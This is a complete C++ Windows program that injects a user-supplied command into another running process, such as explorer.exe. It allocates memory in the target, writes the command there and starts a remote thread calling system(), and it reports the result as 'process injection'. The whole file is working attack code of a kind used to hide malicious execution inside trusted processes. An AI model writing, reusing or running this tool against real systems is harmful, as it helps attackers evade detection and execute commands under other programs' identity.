#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

// Function to find the process ID by its name (using Unicode API)
DWORD FindProcessId(const std::wstring& processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnapshot, &processEntry)) {
            do {
                if (_wcsicmp(processEntry.szExeFile, processName.c_str()) == 0) {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &processEntry));
        }
    }
    CloseHandle(hSnapshot);
    return processId;
}

int main(int argc, char* argv[]) {
    // Check if required arguments are provided:
    // argv[1] - target process name, argv[2] and onward - command to execute
    if (argc < 3) {
        std::cout << "Usage: " << argv[0] << " <ProcessName.exe> <Command>\n";
        std::cout << "Example: " << argv[0] << " explorer.exe \"python.exe C:\\MyFolder\\myscript.py\"\n";
        return 1;
    }

    // Get target process name from the first argument
    std::string targetProcessNameStr(argv[1]);
    std::wstring targetProcessName(targetProcessNameStr.begin(), targetProcessNameStr.end());

    // Combine all arguments starting from the second one into a single command string
    std::string commandStr;
    for (int i = 2; i < argc; ++i) {
        commandStr += argv[i];
        if (i < argc - 1) {
            commandStr += " ";
        }
    }

    std::cout << "Command to execute: " << commandStr << "\n";

    // Find the PID of the target process
    DWORD targetPid = FindProcessId(targetProcessName);
    if (targetPid == 0) {
        std::cerr << "Process " << targetProcessNameStr << " not found!\n";
        return 1;
    }
    std::cout << "Found process " << targetProcessNameStr << " with PID " << targetPid << "\n";

    // Calculate the size of the command string including the null terminator
    size_t commandSize = commandStr.size() + 1;

    // 1. Open the target process with required access rights
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        std::cerr << "OpenProcess error: " << GetLastError() << "\n";
        return 1;
    }

    // 2. Allocate memory in the target process's address space for the command string
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, commandSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        std::cerr << "VirtualAllocEx error: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return 1;
    }

    // 3. Write the command string into the allocated memory of the target process
    if (!WriteProcessMemory(hProcess, remoteMem, commandStr.c_str(), commandSize, NULL)) {
        std::cerr << "WriteProcessMemory error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 4. Get the address of the system function from msvcrt.dll
    HMODULE hMsvcrt = GetModuleHandleA("msvcrt.dll");
    if (!hMsvcrt) {
        hMsvcrt = LoadLibraryA("msvcrt.dll");
        if (!hMsvcrt) {
            std::cerr << "Failed to load msvcrt.dll: " << GetLastError() << "\n";
            // Handle the error accordingly.
            return 1;
        }
    }


    LPVOID systemAddr = (LPVOID)GetProcAddress(hMsvcrt, "system");
    if (!systemAddr) {
        std::cerr << "GetProcAddress (system) error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 5. Create a remote thread in the target process that calls system(remoteMem)
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)systemAddr,
        remoteMem,
        0,
        NULL
    );
    if (!hThread) {
        std::cerr << "CreateRemoteThread error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the remote thread to finish execution
    WaitForSingleObject(hThread, INFINITE);
    std::cout << "Command executed via process injection.\n";

    // Clean up resources
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
